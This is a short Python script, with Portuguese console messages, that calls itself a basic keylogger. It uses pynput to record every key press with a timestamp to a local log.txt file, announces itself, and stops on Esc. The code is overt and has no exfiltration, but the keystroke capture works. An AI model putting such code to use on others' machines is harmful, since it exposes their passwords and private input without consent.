from pynput.keyboard import Key, Listener
import logging


log_file = "log.txt"

logging.basicConfig(filename=log_file, 
                    level=logging.DEBUG, 
                    format="%(asctime)s: %(message)s")

print("Iniciando keylogger básico...")
print(f"Salvando teclas em '{log_file}'")
print("Pressione a tecla 'Esc' para SAIR.")

def on_press(key):
   
    try:
        
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    
    if key == Key.esc:
        print("\nTecla 'Esc' pressionada. Encerrando o keylogger.")
        logging.info("Keylogger encerrado.")
        
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    
    listener.join()